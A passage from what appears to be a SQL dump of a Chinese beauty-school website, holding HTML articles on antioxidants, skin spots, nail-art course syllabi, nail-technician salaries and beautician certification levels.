margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　氧自由基是人体细胞在氧化代谢过程中，生成的一种代谢产物，过多的自由基积存，会损害机体细胞的细胞膜，使细胞受损，从而使人衰老。服用一些能祛除体内自由基、提高人体的抗氧化能力，从而达到抗疲劳、延缓衰老的目的。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　4、什么是天然抗氧化剂?</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　主要是指水果和蔬菜中所含的抗氧化剂。所有水果和蔬果中都含有天然抗氧化剂，如维生素A、C、E、P、多酚等。研究表明水果和蔬菜中的天然抗氧化剂具有保护效果。例如维生素 E 和 β -胡萝卜素可以保护细胞膜;维生素 C 可以排出细胞内的自由基，等等。天然抗氧化剂可以帮助人类预防心脏病和癌症等多种疾病，并能增进脑力，延缓衰老。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　&nbsp;</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　5、产生氧化的原因?</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　皮肤是覆盖在人体表面的第一道天然防线，长期暴露在大自然之中，每时每刻都在受到环境污染、紫外线、工作压力、有害物质、营养等因素的氧化，产生大量的氧自由基，破坏我们的健康细胞，令细胞脱水、干枯乃至于死亡。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　6、祛斑美白作用原理是什么?</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　a 祛除表面导致肤色黯沉的老化角质。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　b 有效作用于麦拉宁细胞，抑制酪氨酸酶的活化，抑制黑色素生成，淡化色斑。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　c 阻挡晒伤和晒黑肌肤的紫外线</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　d 深层滋养基底细胞，澄净柔白本质。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　e 深层祛斑美白、持久祛斑美白。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　7、为什么会长斑?</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　日常生活中，紫外线、污染、辐射、烟尘、氧化自由基等时时侵害着娇嫩的肌肤，肌肤在自我保护过程中产生大量黑色素。通常黑色素会随着肌肤代谢和老化角质一起脱落，但如果肌肤代谢不畅，过多紫外线等外界刺激以及身体机能异常，黑色素就会堆积，造成色斑、暗沉。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　8、不同斑反映什么肌肤问题?</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　1)黄褐斑(蝴蝶班/妊娠斑)：细胞被氧化，肌肤“生锈”了。多对称分布于脸颊、额头、鼻部等处。与内分泌和身体脏腑健康有关。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　2)晒斑(暗疮印/外伤性色素斑/日晒斑/辐射斑) ：细胞“受伤”了，皮肤变“花”了。多分布于额头、脸颊及太阳穴附近。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">　　3)雀斑(敏感性色素沉着斑/铅汞中毒型色斑)：黑色素细胞“分家”，“麻麻点点”出来了。 对称分布在鼻梁和鼻翼两侧，青春期和夏季日晒后，斑点数目会增加，颜色会加深。</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 8px 0px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(85, 85, 85); font-family: arial, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, sans-serif; line-height: 30px; white-space: normal; background: rgb(255, 255, 255);\"><br/></p><p><br/></p>','','','219.147.98.86'),(45,28,'<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/190224/1-1Z224143629140.jpg\" style=\"width: 80%;\" /><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/190224/1-1Z224143QX37.jpg\" style=\"width: 80%;\" /></div>\r\n','','','36.102.4.97'),(46,29,'<p><img alt=\"\" src=\"/uploads/allimg/190224/1-1Z22414402G60.jpg\" style=\"width: 80%;\"/></p>','','','123.126.152.178'),(47,20,'<p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">专业介绍</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">学时:1个半月<br/>适合人群:适合没有美甲基础、投入学习时间短暂，短时间内了解美甲店铺技师的全面技术、开设专业美甲沙龙店铺、考取国家劳动局高级美甲师资格证、学成后投入到美甲店高级以上技师水平的工作、考试合格后工资底薪约2000以上，可推荐到加盟店或其它店铺投入工作或开店。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p style=\"text-align:center\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><img src=\"/uploads/allimg/20190303/1551618466570282.jpg\" title=\"1551618466570282.jpg\" alt=\"1 (10).jpg\"/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">课程内容</span></p><h4><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">时尚美甲基础课程</span></h4><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">1:理论知识：<br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; background-color: rgb(255, 255, 255);\"/>美甲基本概念、美甲起源发展趋势、美甲师职业道德及礼仪规范、美甲服务分类及收费标准、指甲外形与结构、指甲失调认识与疾病处理、美甲产品的分类及使用方法、沙龙的卫生安全与消毒、美甲常用英文、美甲疑难问题解决、美甲服务方案拟定、细菌学、卫生学、美甲店经营管理课。</span></p><p><br/></p><p><br style=\"white-space: normal; background-color: rgb(255, 255, 255);\"/><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">2:自然甲操作：<br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; background-color: rgb(255, 255, 255);\"/>自然甲各种形状的修整、自然修甲、手法式修甲、手部皮肤护理、美白手护理、干裂手护理、手护按摩技法、足部皮肤护理、足法式修甲、足护按摩技法、甲油品牌认识与甲油的选择与涂法；甲油彩绘、甲油幻彩、贴花、镶钻、吊饰、艺术勾花、甲油拓印。。。。。。</span></p><p><br/></p>','','','219.147.98.86'),(48,20,'<p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"></span></p><h3 style=\"text-indent: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">课程介绍：</span></h3><p style=\"text-indent: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">此专业是为塑造高级美甲师而开设的，从最基础的自然甲护理／法式水晶／贴片甲／三维立体雕花到国际上流行的水晶浮雕／琉璃甲/光疗树脂甲／手部彩绘到仪器的使用都包含在课程里面。不仅掌握全面扎实的美甲技术，还会涉及到店铺经营管理的课程，让您不仅可以胜任美甲师的工作，还可以更好的发展自己的美甲事业。</span></p><h3 style=\"text-indent: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">培养目标：</span></h3><p style=\"text-indent: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">掌握高级美甲师技能技术是最基本的要求，同时培养具有专业知识全面以及潮流时尚审美，能够独立完成各种美甲工作。</span></p><h3 style=\"text-indent: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">就业方向：</span></h3><p style=\"text-indent: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">可在世界时尚品牌公司、电视台、影视剧组、广告公司、摄影公司、化妆美容美发美甲设计中心、各大形象设计连锁店就职，担任高级美甲师、营销主管、区域经理、店面店长等职位。</span></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; 彩绘知识：<br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; text-align: left; background-color: rgb(255, 255, 255);\"/>&nbsp; &nbsp; &nbsp; 新产品工具介绍、工具材料的准备、手绘工具材料的介绍和使用方法、色彩的重要性、概念及色彩不同的分类方式、色彩混合、色彩的搭配、色调的组织及调和原理、初级彩绘知识、手绘的技能技巧、点、线、面、各种花瓣、图腾、色块、线条的应用、整体彩绘组合。中级彩绘各种花型的绘制、色彩的重要性概念及色彩分类混合构图种类、色彩元素运用要诀、图案与甲片的结合、情景写意彩绘、各中色彩的晕染过色技巧及颜料底色的制作、花卉白描笔法理论简介；白描底图工艺拷贝技法；色彩搭配、过色、晕染、平涂技巧；白描花卉技法；淡彩、重彩晕染技法；高级彩绘的3D创意手绘花卉、植物的彩绘技巧、基本手法及10种花型的绘制（玫瑰、牡丹、荷花、百合、三色堇等。。。。。。。）。<br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; text-align: left; background-color: rgb(255, 255, 255);\"/></span></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551618311208335.jpg\" title=\"1551618311208335.jpg\" alt=\"2 (9).jpg\"/></p><p><br/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; 贴片甲操作：<br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; text-align: left; background-color: rgb(255, 255, 255);\"/>&nbsp; &nbsp; &nbsp; 贴片甲材料、工具知识简介、甲片的选择、修整、粘贴方法、全套贴片甲制作（包含全贴、半贴、浅贴）、单色水晶甲贴片制作、打磨、彩色贴片水晶甲制作、各种镭射贴片水晶甲制作；法式贴片水晶甲、干花、贝壳在贴片水晶甲上的应用、贴花、镶钻、吊饰、甲油拓印、图片拷贝、法式贴片光疗、琉璃贴片光疗、贴片丝绸甲。<br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; text-align: left; background-color: rgb(255, 255, 255);\"/><br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; text-align: left; background-color: rgb(255, 255, 255);\"/>&nbsp; &nbsp; &nbsp; 水晶甲操作：<br style=\"color: rgb(51, 51, 51); font-family: 微软雅黑; font-size: 14px; line-height: 28px; white-space: normal; text-align: left; background-color: rgb(255, 255, 255);\"/>&nbsp; &nbsp; &nbsp;水晶甲的认识及分类、水晶笔的结构，保养及使用、指托板的种类和使用方法、纸托板的佩戴技巧、自然水晶甲的制作、单色水晶甲纸板练习、假手制作、打磨、单色水晶甲制作、法式水晶甲纸板练习、法式水晶甲、镭射水晶甲色彩、色块搭配、色彩过渡技巧、彩色水晶甲制作、水晶甲内镶嵌镭射亮片、贝壳粉、贝壳贴等、残甲修复、水晶甲修补、水晶指甲的卸除、打磨机的使用及维护、参赛法式、粉胶甲、琉璃甲、倒转法式、创意水晶甲。</span></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p>','','','219.147.98.85'),(49,10,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879806556971.jpg\" style=\"\" title=\"1551879806556971.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879806702505.jpg\" style=\"\" title=\"1551879806702505.jpg\"/></p><p style=\"text-align: center;\"><br/></p>','','','219.147.98.86'),(50,10,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879680428478.jpg\" style=\"\" title=\"1551879680428478.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879680190549.jpg\" style=\"\" title=\"1551879680190549.jpg\"/></p><p style=\"text-align: center;\"><br/></p>','','','219.147.98.86'),(51,10,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879473462891.jpg\" style=\"\" title=\"1551879473462891.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879473420241.jpg\" style=\"\" title=\"1551879473420241.jpg\"/></p><p style=\"text-align: center;\"><br/></p>','','','219.147.98.86'),(52,10,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879396288855.jpg\" style=\"\" title=\"1551879396288855.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551879396323232.jpg\" style=\"\" title=\"1551879396323232.jpg\"/></p><p style=\"text-align: center;\"><br/></p>','','','219.147.98.86'),(53,23,'<p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">作为时尚行业中的一员，美甲师应当具备何种职业技能呢？作为美的缔造者，作为时尚的引领者，美甲师当然是必须具备一些特有的技能与素养，那么成为专业的美甲师需要有什么样的技能，什么样的素养，又需要什么样的条件呢？</span></p><p><br style=\"text-align: left;\"/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">美甲师在工作中，主要是为顾客打造出靓丽的美甲，能够倾听顾客的要求，适当提出自己的建议，再根据顾客的脸型、气质等方面为顾客挖掘出独具魅力的一面，令整体造型表现出内在气质。从这点来看，美甲师一般需要的条件便是：努力磨练自己的美甲技术，拥有较强的适应能力，拥有较强的沟通能力，建立良好的人脉，懂得把握机会，并且需要不断学习进步。</span></p><p><br style=\"text-align: left;\"/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">美甲师应当具备何种职业技能呢？综合来看，美甲师需要具备的职业技能有，良好的审美能力，丰富的想象力，敏锐的观察能力，深刻的感受能力以及熟练的表现能力。美甲是一门技术，更是一门综合性艺术，若想成为优秀的美甲师，想成为美的缔造者，必须应当具备良好的审美能力，能去欣赏与感受美丽，能从不同角度去挖掘出更美丽的一面</span></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190228/1551363975827268.jpg\" title=\"1551363975827268.jpg\" alt=\"3 (16).jpg\"/></p><p><br/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">若一名优秀的美甲师没有丰富的想象力，那么可以想象出他所打造的妆面定是没有灵魂，没有感染力的，只是千篇一律的美甲款式中的一面罢了，这样没有想象力的美甲师定不会有发展的。所以想象力对于美甲师来说极为重要。</span></p><p><br style=\"text-align: left;\"/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">观察力对优秀的美甲师来说同样不可缺少，没有敏锐的观察力，就不能了解顾客的甲型、气质等特征，也就不能完成一个好的美甲。感受力对优秀的美甲师来说也很重要，感受即感觉加感情，可以以顾客的立场出发，感受顾客需要什么样的美甲款式，你才能为顾客打造出满意的妆容。</span></p><p><br style=\"text-align: left;\"/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">表现力对艺术家来说不可缺少，对美甲师来说亦如此。表现力即创造力，以前四种技能为基础，按照美的养成规律，运用美甲造型技巧创造美。由此可见，美甲师应当善于观察，大胆想象与发现，以独特的审美观，运用美甲技巧将美丽放大，将美丽变得更加生动与具体。</span></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p style=\"text-align: center;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><img src=\"/uploads/allimg/20190228/1551364013439799.jpg\" title=\"1551364013439799.jpg\" alt=\"2 (9).jpg\" width=\"556\" height=\"285\" style=\"width: 556px; height: 285px;\"/></span></p><p><br style=\"text-align: left;\"/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">外表整洁大方以及态度礼貌谦的美甲师最能留给顾客深刻的印象。所以美甲师还需要注意自身的形象，保持干净整洁，还需要注意自身的礼仪，应当注意从顾客角度出发，礼貌交流，也需要重视服务理念。</span></p><p><br style=\"text-align: left;\"/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">美甲师是能美化人们指尖颜的艺术家，是能化腐朽为神奇的魔术师，要想成为优秀者，美甲师应当具备何种职业技能？必定需要兼备德艺素养，作为明日的美甲师，您的美甲师专业技能都具备了吗？</span></p><p><br style=\"text-align: left;\"/></p>','','','36.102.4.97'),(54,23,'<p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp;美甲师工资待遇怎么样?继美容师后，美甲师成为时下最热门的职业。由于美甲师入门门槛很低，所以很多女生学美甲没多久就当上了美甲师，但工资还是存在一些差异的，这是什么原因造成的呢?目前国内的美甲师职业队伍还是参差不齐的，专业美甲技师供不应求。专业美甲师不仅要具备一定的文化知识和专业技能，还要具有美术基础及审美能力，能根据客户的要求设计款式，自然而然，专业美甲师的工资待遇比较高。</span></p><p style=\"text-align: center;\"><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190228/1551364148936692.jpg\" title=\"1551364148936692.jpg\" alt=\"6 (2).jpg\"/></p><p><br/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp;除了专业能力外，美甲师工资待遇还受地域、工作年限、职业资格、学历等的影响，一般来说，初级美甲师月薪在1500-3000元之间，中级美甲师工资待遇在3000-5000元之间，除了这些基本收入，还有提成和奖金。工资高低可以由你的技术来决定，如果你技术过硬，那么月薪过万也是很有可能的，但是首先你要有一个很精湛的技术，和不错的服务，和顾客的关系处理的很好，那么你的口碑肯定是会越来越好，美甲师主要是依靠技术和服务来说话的。</span></p><p><br style=\"text-align: left;\"/></p><p style=\"text-align: left;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp;目前美甲行业被称为暴利行业，不少美甲师积累了一定的经验后，都选择自己创业，如果经营得好，收入就更可观了，但是创业的前提下也是要打下坚实的基础，想当一名美甲师，就要先去一个专业的培训学校，学校采用多媒体教学，分科小班制授课，随到随学，一对一辅导，包学包会包分配工作，终身免费复训，使每个学员都能享受最优质的教学质量和教学环境。&nbsp;</span></p><p><br style=\"text-align: left;\"/></p>','','','36.102.4.97'),(55,28,'<p style=\"text-align: center;\">美容教室</p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551522524875482.jpg\" style=\"\" title=\"1551522524875482.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551522524994389.jpg\" style=\"\" title=\"1551522524994389.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551522524205758.jpg\" style=\"\" title=\"1551522524205758.jpg\"/></p><p style=\"text-align: center;\">化妆教室</p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551522524148726.jpg\" style=\"\" title=\"1551522524148726.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551522524830355.jpg\" style=\"\" title=\"1551522524830355.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551522524897915.jpg\" style=\"\" title=\"1551522524897915.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(56,6,'<p><br/></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">国家职业资格证书</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">中华人民共和国劳动法明确规定持证上岗，所谓就业准入是指根据《劳动法》和《职业教育法》的有关规定，对从事技术复杂、通用性广、涉及到国家财产、人民生命安全和消费者利益的职业（工种）的劳动者，必须经过培训，并取得职业资格证书后，方可就业上岗</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">职业资格证书的等级</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">我国职业资格证书分为五个等级：初级（五级）、中级（四级）、高级（三级）、技师（二级）和高级技师（一级）</span></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551523101100745.jpg\" title=\"1551523101100745.jpg\" alt=\"timg.jpg\"/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">下面介绍我们常见的初级、中级、高级美容师资格证书</span></p><p><br/></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">【初级美容师】</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆ 申报条件</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（一）在本工种连续工作2年以上；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（二）在本工种学徒期满；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（三）经正规初级美容师技能培训，取得毕（结）业证书。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">具备上述条件之一，可申报初级美容师职业技能鉴定。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆ 鉴定方式</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">按照标准参照型要求考核（也称水平考核）。知识要求和心智技能考核采取闭卷笔试。题型及配分比例为：填空题30%，是非判断题20%，选择题20%，简答题20%，，素描色彩绘画题10%。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 